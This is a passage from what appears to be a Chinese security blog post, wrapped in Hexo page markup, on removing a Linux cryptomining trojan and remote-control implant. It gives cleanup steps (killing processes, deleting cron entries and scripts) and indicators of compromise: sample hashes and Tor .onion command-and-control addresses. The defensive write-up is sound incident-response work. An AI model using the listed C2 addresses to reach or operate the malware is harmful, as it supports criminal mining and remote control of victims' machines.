+<h2 id="处置"><a href="#处置" class="headerlink" title="处置"></a>处置</h2><p>1、通过查看&#x2F;tmp&#x2F;.X11-unix&#x2F;文件，获取挖矿和远控的进程id,使用 <code> kill -9 进程id</code> 杀死相关进程<br>2、使用 <code>crontab -e</code> 命令，移除第一个定时任务，然后删除 <code>/etc/cron.d/0systemd-private-* </code> 文件<br>3、删除 <code>/opt/systemd-private-*.sh</code> shell脚本<br>4、对于&#x2F;tmp和&#x2F;dev&#x2F;shm文件，重启系统，下载的恶意文件就会自动清楚。<br>5、由于我这里是直接拿一个最小化安装的Linux系统做分析，样本都是我自行部署的，现实情况下，攻击者可能通过其他途径，如：弱口令、RCE等形式部署的自动或者半自动部署的挖矿及远控程序，直白一点儿就是移除挖矿比较容易，但是定位攻击者从那里进来的比较困难，各位老铁要加油，实在不行，重做系统吧。</p>
+<h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><p>挖矿样本hash：<br>MD5 79d6d20a4500eeffe225de74164ad59e<br>SHA-1 1e52c9a4c8402543125f937c7c3eaf1b206d1b6e<br>SHA-256 e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8</p>
+<p>远控样本(int.x86_64)hash：<br>MD5 079d848dd5b0ad35f5d5d7a5b52ea0bf<br>SHA-1 13cd0f45b112cd60e34620991261f2f3f3b009f9<br>SHA-256 d56ff8bd5356862356379182f60b51795bbe9e3bc077ea2fd20d1d30011ab163</p>
+<p>mhevkk4odgzqpt2hbj3hhw2uz4vhunoo55evewrgmouyiehcaltmbrqd.onion<br>unixdbnuadxmwtob.onion<br>*.tor2web.it<br>*.tor2web.in<br>*.tor2web.ch<br>*.tor2web.io<br>*.tor2web.to<br>*.tor2web.su</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8/details">https://www.virustotal.com/gui/file/e45da0ba81b4d06737aaa79b096c2d11eeed0952c7d1ba9c65e81de41bd1fbd8/details</a>【virustotal 挖矿分析结果 】</li>
+<li><a target="_blank" rel="noopener" href="https://zh.gouma.org/Internet/How-to-Access-onion-Sites-Also-Known-as-Tor-Hidden-Services-/">https://zh.gouma.org/Internet/How-to-Access-onion-Sites-Also-Known-as-Tor-Hidden-Services-/</a>【Tor隐藏服务】</li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/233138.html">https://www.freebuf.com/articles/system/233138.html</a>【SystemedMiner再次更新，使用Socket5中转访问C&amp;C】</li>
+<li><a href="https://hksanduo.github.io/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun">https://hksanduo.github.io/2019/12/19/2019-12-19-clean-up-a-mining-trojan-named-aliyun</a>【一个名叫aliyun的挖矿木马处理过程】</li>
+<li><a target="_blank" rel="noopener" href="https://blog.netlab.360.com/systemdminer-jie-ji-xia-dan-tong-guo-ddg-chuan-bo-zi-shen/">https://blog.netlab.360.com/systemdminer-jie-ji-xia-dan-tong-guo-ddg-chuan-bo-zi-shen/</a>【systemdMiner 借鸡下蛋，通过 DDG 传播自身】</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Security/">Security</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Trojan/">Trojan</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/09/2021-11-09-ireader-smart-xs-pro-crack/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">掌阅ireader smart xs pro 安装第三方软件</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/06/2021-11-06-install-esxi-on-interstellar-snails/">
+                        <span class="hidden-mobile">在星际蜗牛上安装ESXI 6.7 及openwrt</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'hksanduo/commit-utterances');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-167858469-1', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
